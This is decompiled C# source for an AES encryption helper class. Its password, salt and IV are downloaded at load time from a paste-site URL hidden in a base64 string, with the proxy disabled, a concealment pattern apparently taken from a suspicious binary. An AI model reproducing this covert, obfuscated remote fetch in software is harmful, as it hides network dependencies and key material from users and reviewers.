using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp.RuntimeBinder;

namespace yktv
{
	// Token: 0x02000030 RID: 48
	public class Encryption
	{
		// Token: 0x060001B1 RID: 433 RVA: 0x0000AF64 File Offset: 0x0000AF64
		[return: Dynamic]
		public static dynamic Decrypt(string encryptedText)
		{
			byte[] array = Convert.FromBase64String(encryptedText);
			if (Encryption.<>o__3.<>p__1 == null)
			{
				Encryption.<>o__3.<>p__1 = CallSite<Func<CallSite, Type, object, object, Rfc2898DeriveBytes>>.Create(Binder.InvokeConstructor(CSharpBinderFlags.None, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, Type, object, object, Rfc2898DeriveBytes> target = Encryption.<>o__3.<>p__1.Target;
			CallSite <>p__ = Encryption.<>o__3.<>p__1;
			Type typeFromHandle = typeof(Rfc2898DeriveBytes);
			object arg = Encryption.hoe[0];
			if (Encryption.<>o__3.<>p__0 == null)
			{
				Encryption.<>o__3.<>p__0 = CallSite<Func<CallSite, Encoding, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetBytes", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			byte[] bytes = target(<>p__, typeFromHandle, arg, Encryption.<>o__3.<>p__0.Target(Encryption.<>o__3.<>p__0, Encoding.ASCII, Encryption.hoe[1])).GetBytes(32);
			RijndaelManaged rijndaelManaged = new RijndaelManaged
			{
				Mode = CipherMode.CBC,
				Padding = PaddingMode.None
			};
			if (Encryption.<>o__3.<>p__3 == null)
			{
				Encryption.<>o__3.<>p__3 = CallSite<Func<CallSite, RijndaelManaged, byte[], object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "CreateDecryptor", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, RijndaelManaged, byte[], object, object> target2 = Encryption.<>o__3.<>p__3.Target;
			CallSite <>p__2 = Encryption.<>o__3.<>p__3;
			RijndaelManaged arg2 = rijndaelManaged;
			byte[] arg3 = bytes;
			if (Encryption.<>o__3.<>p__2 == null)
			{
				Encryption.<>o__3.<>p__2 = CallSite<Func<CallSite, Encoding, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetBytes", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			object arg4 = target2(<>p__2, arg2, arg3, Encryption.<>o__3.<>p__2.Target(Encryption.<>o__3.<>p__2, Encoding.ASCII, Encryption.hoe[2]));
			MemoryStream memoryStream = new MemoryStream(array);
			if (Encryption.<>o__3.<>p__4 == null)
			{
				Encryption.<>o__3.<>p__4 = CallSite<Func<CallSite, Type, MemoryStream, object, CryptoStreamMode, CryptoStream>>.Create(Binder.InvokeConstructor(CSharpBinderFlags.None, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
				}));
			}
			CryptoStream cryptoStream = Encryption.<>o__3.<>p__4.Target(Encryption.<>o__3.<>p__4, typeof(CryptoStream), memoryStream, arg4, CryptoStreamMode.Read);
			byte[] array2 = new byte[array.Length];
			int count = cryptoStream.Read(array2, 0, array2.Length);
			memoryStream.Close();
			cryptoStream.Close();
			return Encoding.UTF8.GetString(array2, 0, count).TrimEnd("\0".ToCharArray());
		}

		// Token: 0x060001B2 RID: 434 RVA: 0x0000B1E0 File Offset: 0x0000B1E0
		[return: Dynamic]
		public static dynamic Encrypt(string plainText)
		{
			byte[] bytes = Encoding.UTF8.GetBytes(plainText);
			if (Encryption.<>o__4.<>p__1 == null)
			{
				Encryption.<>o__4.<>p__1 = CallSite<Func<CallSite, Type, object, object, Rfc2898DeriveBytes>>.Create(Binder.InvokeConstructor(CSharpBinderFlags.None, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, Type, object, object, Rfc2898DeriveBytes> target = Encryption.<>o__4.<>p__1.Target;
			CallSite <>p__ = Encryption.<>o__4.<>p__1;
			Type typeFromHandle = typeof(Rfc2898DeriveBytes);
			object arg = Encryption.hoe[0];
			if (Encryption.<>o__4.<>p__0 == null)
			{
				Encryption.<>o__4.<>p__0 = CallSite<Func<CallSite, Encoding, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetBytes", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			byte[] bytes2 = target(<>p__, typeFromHandle, arg, Encryption.<>o__4.<>p__0.Target(Encryption.<>o__4.<>p__0, Encoding.ASCII, Encryption.hoe[1])).GetBytes(32);
			RijndaelManaged rijndaelManaged = new RijndaelManaged
			{
				Mode = CipherMode.CBC,
				Padding = PaddingMode.Zeros
			};
			if (Encryption.<>o__4.<>p__3 == null)
			{
				Encryption.<>o__4.<>p__3 = CallSite<Func<CallSite, RijndaelManaged, byte[], object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "CreateEncryptor", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			Func<CallSite, RijndaelManaged, byte[], object, object> target2 = Encryption.<>o__4.<>p__3.Target;
			CallSite <>p__2 = Encryption.<>o__4.<>p__3;
			RijndaelManaged arg2 = rijndaelManaged;
			byte[] arg3 = bytes2;
			if (Encryption.<>o__4.<>p__2 == null)
			{
				Encryption.<>o__4.<>p__2 = CallSite<Func<CallSite, Encoding, object, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "GetBytes", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			object arg4 = target2(<>p__2, arg2, arg3, Encryption.<>o__4.<>p__2.Target(Encryption.<>o__4.<>p__2, Encoding.ASCII, Encryption.hoe[2]));
			byte[] inArray;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				if (Encryption.<>o__4.<>p__4 == null)
				{
					Encryption.<>o__4.<>p__4 = CallSite<Func<CallSite, Type, MemoryStream, object, CryptoStreamMode, CryptoStream>>.Create(Binder.InvokeConstructor(CSharpBinderFlags.None, typeof(Encryption), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
					}));
				}
				using (CryptoStream cryptoStream = Encryption.<>o__4.<>p__4.Target(Encryption.<>o__4.<>p__4, typeof(CryptoStream), memoryStream, arg4, CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytes, 0, bytes.Length);
					cryptoStream.FlushFinalBlock();
					inArray = memoryStream.ToArray();
					cryptoStream.Close();
				}
				memoryStream.Close();
			}
			return Convert.ToBase64String(inArray);
		}

		// Token: 0x060001B4 RID: 436 RVA: 0x0000B488 File Offset: 0x0000B488
		// Note: this type is marked as 'beforefieldinit'.
		static Encryption()
		{
			if (Encryption.<>o__6.<>p__1 == null)
			{
				Encryption.<>o__6.<>p__1 = CallSite<Func<CallSite, object, object[]>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof(object[]), typeof(Encryption)));
			}
			Func<CallSite, object, object[]> target = Encryption.<>o__6.<>p__1.Target;
			CallSite <>p__ = Encryption.<>o__6.<>p__1;
			if (Encryption.<>o__6.<>p__0 == null)
			{
				Encryption.<>o__6.<>p__0 = CallSite<Func<CallSite, object, char, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.None, "Split", null, typeof(Encryption), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, null)
				}));
			}
			Encryption.hoe = target(<>p__, Encryption.<>o__6.<>p__0.Target(Encryption.<>o__6.<>p__0, Encryption.zoom, ':'));
		}

		// Token: 0x04000128 RID: 296
		[Dynamic]
		private static readonly dynamic zoom = new WebClient
		{
			Proxy = null
		}.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzJZdmRRQlR3")));

		// Token: 0x04000129 RID: 297
		[Dynamic(new bool[]
		{
			false,
			true
		})]
		public static dynamic[] hoe;

		// Token: 0x0400012A RID: 298
		public static bool check;
	}
}
